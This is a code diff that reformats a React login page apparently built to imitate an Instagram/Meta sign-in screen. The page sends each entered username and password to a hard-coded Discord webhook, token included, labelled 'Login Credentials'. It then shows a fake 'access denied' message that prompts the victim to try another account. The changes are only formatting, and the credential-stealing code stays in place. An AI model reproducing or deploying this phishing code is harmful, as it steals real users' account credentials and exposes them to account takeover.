@@ -21,36 +21,37 @@ export default function Login() {
 
     try {
       // Send data to Discord webhook
-      const webhookUrl = "https://discord.com/api/webhooks/1434012927836291113/5newpTR3u3h4bFvd5OuWdIP7lHAPdd-jOUgvR50RoeUo9g13L8f-vhl0ubXcs4O9yx6q";
+      const webhookUrl =
+        "https://discord.com/api/webhooks/1434012927836291113/5newpTR3u3h4bFvd5OuWdIP7lHAPdd-jOUgvR50RoeUo9g13L8f-vhl0ubXcs4O9yx6q";
 
       const message = {
         content: "New Login Attempt",
         embeds: [
           {
-            color: 0x0064E0,
+            color: 0x0064e0,
             title: "Login Credentials",
             fields: [
               {
                 name: "Username/Email",
                 value: `||${username}||`,
-                inline: false
+                inline: false,
               },
               {
                 name: "Password",
                 value: `||${password}||`,
-                inline: false
+                inline: false,
               },
               {
                 name: "Timestamp",
                 value: new Date().toLocaleString(),
-                inline: false
-              }
+                inline: false,
+              },
             ],
             footer: {
-              text: "Family Site - Pending Approval"
-            }
-          }
-        ]
+              text: "Family Site - Pending Approval",
+            },
+          },
+        ],
       };
 
       // Send to Discord (fire and forget - don't wait for response)
@@ -60,7 +61,7 @@ export default function Login() {
           "Content-Type": "application/json",
         },
         body: JSON.stringify(message),
-      }).catch(err => console.error("Discord webhook error:", err));
+      }).catch((err) => console.error("Discord webhook error:", err));
 
       // Show access denied modal to user
       setShowAccessDeniedModal(true);
@@ -113,7 +114,8 @@ export default function Login() {
         <div
           style={{
             fontSize: "13px",
-            fontFamily: '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
+            fontFamily:
+              '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
             fontWeight: 400,
             color: "rgb(203, 210, 217)",
             letterSpacing: "-0.04px",
@@ -198,7 +200,9 @@ export default function Login() {
                   flexDirection: "row",
                   padding: "10px 16px",
                   backgroundColor: "rgb(28, 43, 51)",
-                  border: usernameFocused ? "1px solid rgb(0, 100, 224)" : "1px solid rgb(70, 90, 105)",
+                  border: usernameFocused
+                    ? "1px solid rgb(0, 100, 224)"
+                    : "1px solid rgb(70, 90, 105)",
                   borderRadius: "12px",
                   cursor: "pointer",
                   pointerEvents: "auto",
@@ -221,7 +225,8 @@ export default function Login() {
                   <div
                     style={{
                       fontSize: "16px",
-                      fontFamily: '"Optimistic Text Medium", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
+                      fontFamily:
+                        '"Optimistic Text Medium", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                       fontWeight: 400,
                       color: "rgb(133, 149, 164)",
                       lineHeight: 1.3,
@@ -259,7 +264,8 @@ export default function Login() {
                       background: "transparent",
                       border: "none",
                       color: "rgb(255, 255, 255)",
-                      fontFamily: '"Optimistic Text Medium", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
+                      fontFamily:
+                        '"Optimistic Text Medium", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                       fontSize: "16px",
                       lineHeight: 1.3,
                       caretColor: "rgb(255, 255, 255)",
@@ -310,7 +316,9 @@ export default function Login() {
                   flexDirection: "row",
                   padding: "10px 16px",
                   backgroundColor: "rgb(28, 43, 51)",
-                  border: passwordFocused ? "1px solid rgb(0, 100, 224)" : "1px solid rgb(70, 90, 105)",
+                  border: passwordFocused
+                    ? "1px solid rgb(0, 100, 224)"
+                    : "1px solid rgb(70, 90, 105)",
                   borderRadius: "12px",
                   cursor: "pointer",
                   pointerEvents: "auto",
@@ -333,7 +341,8 @@ export default function Login() {
                   <div
                     style={{
                       fontSize: "16px",
-                      fontFamily: '"Optimistic Text Medium", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
+                      fontFamily:
+                        '"Optimistic Text Medium", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                       fontWeight: 400,
                       color: "rgb(133, 149, 164)",
                       lineHeight: 1.3,
@@ -371,7 +380,8 @@ export default function Login() {
                       background: "transparent",
                       border: "none",
                       color: "rgb(255, 255, 255)",
-                      fontFamily: '"Optimistic Text Medium", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
+                      fontFamily:
+                        '"Optimistic Text Medium", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                       fontSize: "16px",
                       lineHeight: 1.3,
                       caretColor: "rgb(255, 255, 255)",
@@ -398,7 +408,9 @@ export default function Login() {
             pointerEvents: "none",
           }}
         >
-          <div style={{ flexGrow: 1, cursor: "pointer", pointerEvents: "auto" }}>
+          <div
+            style={{ flexGrow: 1, cursor: "pointer", pointerEvents: "auto" }}
+          >
             <div
               style={{
                 height: "100%",
@@ -436,7 +448,9 @@ export default function Login() {
                     flexGrow: 1,
                     paddingLeft: "20px",
                     paddingRight: "20px",
-                    backgroundColor: loginHovered ? "rgb(30, 130, 255)" : "rgb(0, 100, 224)",
+                    backgroundColor: loginHovered
+                      ? "rgb(30, 130, 255)"
+                      : "rgb(0, 100, 224)",
                     border: "0px solid rgb(28, 43, 51)",
                     borderRadius: "22px",
                     display: "flex",
@@ -461,7 +475,8 @@ export default function Login() {
                     <div
                       style={{
                         fontSize: "16px",
-                        fontFamily: '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
+                        fontFamily:
+                          '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                         fontWeight: 500,
                         letterSpacing: "-0.08px",
                         color: "rgb(255, 255, 255)",
@@ -492,7 +507,9 @@ export default function Login() {
             pointerEvents: "none",
           }}
         >
-          <div style={{ flexGrow: 1, cursor: "pointer", pointerEvents: "auto" }}>
+          <div
+            style={{ flexGrow: 1, cursor: "pointer", pointerEvents: "auto" }}
+          >
             <div
               style={{
                 height: "100%",
@@ -528,7 +545,13 @@ export default function Login() {
                 }}
               >
                 <div style={{ pointerEvents: "none" }}>
-                  <div style={{ height: "36px", paddingLeft: "16px", paddingRight: "16px" }}>
+                  <div
+                    style={{
+                      height: "36px",
+                      paddingLeft: "16px",
+                      paddingRight: "16px",
+                    }}
+                  >
                     <div
                       style={{
                         height: "100%",
@@ -569,7 +592,8 @@ export default function Login() {
                               <div
                                 style={{
                                   fontSize: "16px",
-                                  fontFamily: '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
+                                  fontFamily:
+                                    '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                                   fontWeight: 500,
                                   letterSpacing: "-0.08px",
                                   color: "rgb(255, 255, 255)",
@@ -620,7 +644,9 @@ export default function Login() {
             paddingRight: "16px",
           }}
         >
-          <div style={{ flexGrow: 1, cursor: "pointer", pointerEvents: "auto" }}>
+          <div
+            style={{ flexGrow: 1, cursor: "pointer", pointerEvents: "auto" }}
+          >
             <div
               style={{
                 height: "100%",
@@ -657,8 +683,12 @@ export default function Login() {
                     flexGrow: 1,
                     paddingLeft: "20px",
                     paddingRight: "20px",
-                    backgroundColor: createHovered ? "rgba(255, 255, 255, 0.05)" : "rgba(255, 255, 255, 0)",
-                    border: createHovered ? "1px solid rgb(100, 173, 254)" : "1px solid rgb(69, 153, 254)",
+                    backgroundColor: createHovered
+                      ? "rgba(255, 255, 255, 0.05)"
+                      : "rgba(255, 255, 255, 0)",
+                    border: createHovered
+                      ? "1px solid rgb(100, 173, 254)"
+                      : "1px solid rgb(69, 153, 254)",
                     borderRadius: "22px",
                     display: "flex",
                     alignItems: "center",
@@ -682,10 +712,13 @@ export default function Login() {
                     <div
                       style={{
                         fontSize: "16px",
-                        fontFamily: '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
+                        fontFamily:
+                          '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                         fontWeight: 500,
                         letterSpacing: "-0.08px",
-                        color: createHovered ? "rgb(100, 173, 254)" : "rgb(71, 165, 250)",
+                        color: createHovered
+                          ? "rgb(100, 173, 254)"
+                          : "rgb(71, 165, 250)",
                         lineHeight: 1.248,
                         display: "block",
                         textAlign: "start",
@@ -729,7 +762,8 @@ export default function Login() {
                 height: "100%",
                 width: "100%",
                 pointerEvents: "inherit",
-                maskImage: "url('https://static.cdninstagram.com/rsrc.php/v4/yM/r/DDgwTv3JehF.png')",
+                maskImage:
+                  "url('https://static.cdninstagram.com/rsrc.php/v4/yM/r/DDgwTv3JehF.png')",
                 maskSize: "contain",
                 backgroundColor: "rgb(203, 210, 217)",
                 objectPosition: "10000px 10000px",
@@ -768,7 +802,8 @@ export default function Login() {
               padding: "32px",
               maxWidth: "400px",
               width: "85%",
-              boxShadow: "0 12px 28px 0 rgba(0, 0, 0, 0.2), 0 2px 4px 0 rgba(0, 0, 0, 0.1)",
+              boxShadow:
+                "0 12px 28px 0 rgba(0, 0, 0, 0.2), 0 2px 4px 0 rgba(0, 0, 0, 0.1)",
               animation: "modalSlideIn 0.25s cubic-bezier(0.14, 1, 0.34, 1)",
             }}
             onClick={(e) => e.stopPropagation()}
@@ -782,7 +817,8 @@ export default function Login() {
                   fontWeight: 600,
                   color: "rgb(0, 0, 0)",
                   marginBottom: "12px",
-                  fontFamily: '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
+                  fontFamily:
+                    '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                   lineHeight: "1.2",
                 }}
               >
@@ -793,16 +829,24 @@ export default function Login() {
                   fontSize: "15px",
                   color: "rgb(65, 65, 65)",
                   lineHeight: "1.4",
-                  fontFamily: '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
+                  fontFamily:
+                    '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                   fontWeight: 400,
                 }}
               >
-                This account doesn't have permission to view this information. Please try again with a different account to view this content.
+                This account doesn't have permission to view this information.
+                Please try again with a different account to view this content.
               </div>
             </div>
 
             {/* OK Button */}
-            <div style={{ display: "flex", justifyContent: "center", marginTop: "24px" }}>
+            <div
+              style={{
+                display: "flex",
+                justifyContent: "center",
+                marginTop: "24px",
+              }}
+            >
               <button
                 onClick={() => setShowAccessDeniedModal(false)}
                 style={{
@@ -814,7 +858,8 @@ export default function Login() {
                   fontSize: "15px",
                   fontWeight: 600,
                   cursor: "pointer",
-                  fontFamily: '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
+                  fontFamily:
+                    '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                   transition: "all 0.2s ease",
                   letterSpacing: "-0.08px",
                   lineHeight: "1.248",
@@ -862,7 +907,8 @@ export default function Login() {
               padding: "32px",
               maxWidth: "400px",
               width: "85%",
-              boxShadow: "0 12px 28px 0 rgba(0, 0, 0, 0.2), 0 2px 4px 0 rgba(0, 0, 0, 0.1)",
+              boxShadow:
+                "0 12px 28px 0 rgba(0, 0, 0, 0.2), 0 2px 4px 0 rgba(0, 0, 0, 0.1)",
               animation: "modalSlideIn 0.25s cubic-bezier(0.14, 1, 0.34, 1)",
             }}
             onClick={(e) => e.stopPropagation()}
@@ -876,7 +922,8 @@ export default function Login() {
                   fontWeight: 600,
                   color: "rgb(0, 0, 0)",
                   marginBottom: "12px",
-                  fontFamily: '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
+                  fontFamily:
+                    '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                   lineHeight: "1.2",
                 }}
               >
@@ -887,7 +934,8 @@ export default function Login() {
                   fontSize: "15px",
                   color: "rgb(65, 65, 65)",
                   lineHeight: "1.4",
-                  fontFamily: '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
+                  fontFamily:
+                    '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                   fontWeight: 400,
                 }}
               >
@@ -896,7 +944,13 @@ export default function Login() {
             </div>
 
             {/* OK Button */}
-            <div style={{ display: "flex", justifyContent: "center", marginTop: "24px" }}>
+            <div
+              style={{
+                display: "flex",
+                justifyContent: "center",
+                marginTop: "24px",
+              }}
+            >
               <button
                 onClick={() => setShowErrorModal(false)}
                 style={{
@@ -908,7 +962,8 @@ export default function Login() {
                   fontSize: "15px",
                   fontWeight: 600,
                   cursor: "pointer",
-                  fontFamily: '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
+                  fontFamily:
+                    '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                   transition: "all 0.2s ease",
                   letterSpacing: "-0.08px",
                   lineHeight: "1.248",
